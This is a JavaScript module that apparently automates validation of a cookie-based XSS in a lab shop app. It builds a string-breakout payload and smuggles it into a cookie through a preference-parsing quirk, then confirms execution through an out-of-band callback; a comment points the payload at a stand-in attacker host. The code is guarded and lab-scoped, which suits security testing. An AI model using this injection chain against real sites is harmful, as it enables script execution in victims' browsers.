'use strict'

const { createBrowserSession } = require('./browser-session')
const { waitForOast } = require('./readiness')
const { WorkflowError } = require('./errors')
const { sleep, throwIfAborted } = require('./util')

const LAB_COOKIE_NAMES = new Set(['shop_preferences', 'promo_ctx', 'promo_ctx_val'])
const CALLBACK_ID_RE = /^[A-Za-z0-9][A-Za-z0-9_-]{7,63}$/

function joinUrl(baseUrl, pathname) {
  return `${baseUrl}${String(pathname).startsWith('/') ? '' : '/'}${pathname}`
}

async function fetchJson(url, { method = 'GET', signal, timeoutMs }) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), timeoutMs)
  const forwardAbort = () => controller.abort()
  if (signal) signal.addEventListener('abort', forwardAbort, { once: true })
  try {
    const response = await fetch(url, {
      method,
      headers: { accept: 'application/json' },
      signal: controller.signal,
    })
    let payload = null
    try {
      payload = await response.json()
    } catch (_error) {
      payload = null
    }
    return { response, payload }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', forwardAbort)
  }
}

async function fetchJsonWithRetry({ url, method = 'GET', config, signal, attempts = 3 }) {
  let lastError = null
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    throwIfAborted(signal)
    try {
      const result = await fetchJson(url, {
        method,
        signal,
        timeoutMs: Math.min(config.timeoutMs, 10_000),
      })
      if (result.response.ok) return result.payload
      lastError = new Error(`HTTP ${result.response.status}`)
    } catch (error) {
      lastError = error
    }
    if (attempt < attempts) await sleep(250 * attempt, signal)
  }
  throw new WorkflowError({
    message: `OAST request failed after ${attempts} attempts: ${lastError && lastError.message ? lastError.message : 'unknown error'}`,
    step: 'xss-validation',
    category: 'oast',
    transient: true,
  })
}

/**
 * Create a unique callback through the OAST API. The returned URL is validated
 * against the configured OAST origin before it is ever placed in a payload.
 */
async function createOastCallback({ config, logger, signal }) {
  const payload = await fetchJsonWithRetry({
    url: joinUrl(config.oastBaseUrl, '/api/callbacks'),
    method: 'POST',
    config,
    signal,
  })
  if (!payload || payload.status !== 'ok' || !CALLBACK_ID_RE.test(String(payload.id || ''))) {
    throw new WorkflowError({
      message: 'OAST did not return a valid callback identifier',
      step: 'xss-validation',
      category: 'oast',
      transient: true,
    })
  }

  let callbackUrl
  try {
    callbackUrl = new URL(payload.callbackUrl)
  } catch (_error) {
    callbackUrl = null
  }
  const expectedOrigin = new URL(config.oastBaseUrl).origin
  if (
    !callbackUrl ||
    !['http:', 'https:'].includes(callbackUrl.protocol) ||
    callbackUrl.origin !== expectedOrigin ||
    callbackUrl.username ||
    callbackUrl.password ||
    callbackUrl.pathname !== `/c/${payload.id}`
  ) {
    throw new WorkflowError({
      message: 'OAST returned a callback URL outside the configured lab origin',
      step: 'xss-validation',
      category: 'oast',
      transient: false,
    })
  }

  logger.info('xss.callback.created', {
    callbackId: payload.id,
    callbackOrigin: callbackUrl.origin,
  })
  return { id: payload.id, url: callbackUrl.toString() }
}

async function listCallbackInteractions({ config, callbackId, signal }) {
  const url = joinUrl(
    config.oastBaseUrl,
    `/api/interactions?callbackId=${encodeURIComponent(callbackId)}&limit=20`
  )
  const payload = await fetchJsonWithRetry({ url, config, signal })
  if (!payload || payload.status !== 'ok' || !Array.isArray(payload.interactions)) {
    throw new WorkflowError({
      message: 'OAST returned an invalid interaction list',
      step: 'xss-validation',
      category: 'oast',
      transient: true,
    })
  }
  return payload
}

/**
 * The lab's promo_ctx is reflected inside `promoContext: "<value>"`. This
 * harmless marker closes the string and uses an object-literal property value
 * to assign `location`, then reopens the string so the surrounding script stays
 * syntactically valid. It contains no semicolons (the lab cookie parser splits
 * on them), no spaces, and no credentials.
 *
 * Rendered result:
 *   promoContext: "",x:location='http://attckerserver.local:4000/c/<id>',y:""
 */
function buildMarkerPayload(callbackUrl) {
  if (/[\s;"\\]/.test(callbackUrl)) {
    throw new WorkflowError({
      message: 'refusing to build a marker for an unsafe callback URL',
      step: 'xss-validation',
      category: 'xss',
      transient: false,
    })
  }
  return `",x:location='${callbackUrl}',y:"`
}

function safeDecode(value) {
  try {
    return decodeURIComponent(String(value))
  } catch (_error) {
    return String(value)
  }
}

async function readLabCookies(context, baseUrl) {
  const cookies = await context.cookies(baseUrl)
  const result = {}
  for (const cookie of cookies) {
    if (LAB_COOKIE_NAMES.has(cookie.name)) result[cookie.name] = cookie.value
  }
  return result
}

function numericDiscount(value) {
  const raw = safeDecode(value)
  if (!/^[0-9]+$/.test(raw)) return null
  const parsed = Number(raw)
  return parsed >= 0 && parsed <= 100 ? parsed : null
}

function parseCookieHeaderNames(header) {
  const names = new Set()
  for (const part of String(header || '').split(';')) {
    const name = part.trim().split('=')[0]
    if (name) names.add(name)
  }
  return names
}

async function waitForInteraction({ config, callbackId, signal }) {
  const deadline = Date.now() + config.xssCheckTimeoutMs
  while (Date.now() < deadline) {
    throwIfAborted(signal)
    const payload = await listCallbackInteractions({ config, callbackId, signal })
    if (payload.count > 0) {
      const hit = payload.interactions[0]
      return {
        interactionId: hit.id,
        callbackId: hit.callbackId,
        method: hit.method,
        endpoint: hit.endpoint,
        sourceAddress: hit.sourceAddress,
        validation: hit.validation,
      }
    }
    await sleep(250, signal)
  }
  return null
}

/**
 * Explicit, isolated XSS-validation run. This is intentionally separate from
 * the victim's normal browsing: it uses a fresh browser context, synthetic
 * values, the public preference/login pages, and a harmless proof-of-execution
 * navigation marker. It never logs a credential, cookie value, or the marker.
 */
async function runOastXssValidation({ config, logger, signal, cycleId }) {
  const validationId = `xss-${cycleId}`
  logger.info('xss.validation.begin', {
    cycleId: validationId,
    oastOrigin: new URL(config.oastBaseUrl).origin,
  })

  await waitForOast({ config, logger, signal, cycleId: validationId })

  const positive = await createOastCallback({ config, logger, signal })
  const negative = await createOastCallback({ config, logger, signal })
  const marker = buildMarkerPayload(positive.url)

  let session = null
  let negativeContext = null

  try {
    session = await createBrowserSession({ config, logger, cycleId: validationId, signal })
    const { page, context } = session

    // 1. Normal Welcome-page visit initializes promo_ctx/promo_ctx_val.
    const welcome = await page.goto(joinUrl(config.baseUrl, '/'), {
      waitUntil: 'domcontentloaded',
      timeout: config.timeoutMs,
    })
    if (!welcome || welcome.status() >= 400) {
      throw new WorkflowError({
        message: 'could not open the Welcome page to seed lab cookies',
        step: 'xss-validation',
        category: 'navigation',
        transient: true,
      })
    }

    const initial = await readLabCookies(context, config.baseUrl)
    const initialPromoValue = numericDiscount(initial.promo_ctx_val)
    const initialCookieFlow = {
      promoCtxPresent: initial.promo_ctx !== undefined,
      promoCtxIsDefault: safeDecode(initial.promo_ctx) === 'summer_sale',
      promoValNumeric: initialPromoValue !== null,
      promoVal: initialPromoValue,
    }
    if (!initialCookieFlow.promoCtxPresent || !initialCookieFlow.promoValNumeric) {
      throw new WorkflowError({
        message: 'welcome page did not initialize promo_ctx and promo_ctx_val',
        step: 'xss-validation',
        category: 'cookie',
        transient: true,
      })
    }

    // 2. Exercise the documented preference/cookie-parsing interaction. This is
    // a direct request (no page execution) so the following login navigation is
    // unambiguously the step that executes the marker.
    const preferenceValue = `phone promo_ctx=${marker}`
    const preferenceResponse = await context.request.get(
      joinUrl(config.baseUrl, `/preferences=${encodeURIComponent(preferenceValue)}`),
      { maxRedirects: 0, timeout: config.timeoutMs }
    )
    if (preferenceResponse.status() !== 302) {
      throw new WorkflowError({
        message: `preference endpoint returned HTTP ${preferenceResponse.status()} instead of a redirect`,
        step: 'xss-validation',
        category: 'cookie',
        transient: true,
      })
    }

    const afterPreference = await readLabCookies(context, config.baseUrl)
    const afterValue = numericDiscount(afterPreference.promo_ctx_val)
    const cookieFlow = {
      ...initialCookieFlow,
      promoCtxUpdated: safeDecode(afterPreference.promo_ctx) !== safeDecode(initial.promo_ctx),
      promoValUnchanged: afterPreference.promo_ctx_val === initial.promo_ctx_val,
      promoValStillNumeric: afterValue !== null && afterValue === initialPromoValue,
    }
    if (!cookieFlow.promoCtxUpdated || !cookieFlow.promoValUnchanged || !cookieFlow.promoValStillNumeric) {
      throw new WorkflowError({
        message: 'the crafted preference did not update promo_ctx while leaving promo_ctx_val intact',
        step: 'xss-validation',
        category: 'cookie',
        transient: false,
      })
    }

    // 3. Observe the real browser Cookie header on the vulnerable page request.
    const loginUrl = joinUrl(config.baseUrl, '/login')
    let loginCookieNames = new Set()
    let loginHeadersPromise = null
    const onRequest = (request) => {
      if (request.isNavigationRequest() && request.url() === loginUrl) {
        // Playwright omits Cookie from headers(); allHeaders() includes it.
        loginHeadersPromise = request
          .allHeaders()
          .then((headers) => parseCookieHeaderNames(headers.cookie))
          .catch(() => new Set())
      }
    }
    page.on('request', onRequest)

    // The marker navigates the page to the OAST callback, so the navigation may
    // settle on the callback page or abort the original request. Either is fine:
    // the OAST interaction is the proof of execution.
    await page
      .goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: config.timeoutMs })
      .catch(() => null)

    page.off('request', onRequest)
    if (loginHeadersPromise) loginCookieNames = await loginHeadersPromise

    const hit = await waitForInteraction({ config, callbackId: positive.id, signal })
    if (!hit) {
      throw new WorkflowError({
        message: 'no OAST callback was observed; the marker did not execute',
        step: 'xss-validation',
        category: 'xss',
        transient: false,
      })
    }
    if (hit.method !== 'GET' || hit.endpoint !== `/c/${positive.id}`) {
      throw new WorkflowError({
        message: 'the OAST interaction did not match the expected GET callback',
        step: 'xss-validation',
        category: 'xss',
        transient: false,
      })
    }

    // 4. Negative control: visiting the vulnerable page without the crafted
    // cookie must NOT produce a callback for a different identifier.
    negativeContext = await session.browser.newContext({
      viewport: { width: 1366, height: 900 },
      locale: 'en-GB',
      acceptDownloads: false,
    })
    negativeContext.setDefaultTimeout(config.timeoutMs)
    negativeContext.setDefaultNavigationTimeout(config.timeoutMs)
    const negativePage = await negativeContext.newPage()
    await negativePage.goto(loginUrl, {
      waitUntil: 'domcontentloaded',
      timeout: config.timeoutMs,
    })
    await sleep(config.xssCheckNegativeWaitMs, signal)
    const negativeList = await listCallbackInteractions({
      config,
      callbackId: negative.id,
      signal,
    })
    const negativeControlClean = negativeList.count === 0
    if (!negativeControlClean) {
      throw new WorkflowError({
        message: 'plain page visit unexpectedly produced an OAST callback',
        step: 'xss-validation',
        category: 'xss',
        transient: false,
      })
    }

    const result = {
      callbackId: hit.callbackId,
      interactionId: hit.interactionId,
      method: hit.method,
      endpoint: hit.endpoint,
      sourceAddress: hit.sourceAddress,
      validation: hit.validation,
      loginRequestCookieSent: loginCookieNames.has('promo_ctx') && loginCookieNames.has('promo_ctx_val'),
      negativeControlClean,
      cookieFlow,
    }

    logger.info('xss.validation.complete', {
      cycleId: validationId,
      callbackId: result.callbackId,
      interactionId: result.interactionId,
      method: result.method,
      endpoint: result.endpoint,
      sourceAddress: result.sourceAddress,
      validation: result.validation,
      loginRequestCookieSent: result.loginRequestCookieSent,
      negativeControlClean: result.negativeControlClean,
      cookieFlow: result.cookieFlow,
    })

    return result
  } finally {
    if (negativeContext) {
      try {
        await negativeContext.close()
      } catch (_error) {
        // Best-effort cleanup; the main session close below remains authoritative.
      }
    }
    if (session) await session.close()
  }
}

module.exports = {
  runOastXssValidation,
  buildMarkerPayload,
  createOastCallback,
  waitForInteraction,
  readLabCookies,
  numericDiscount,
}
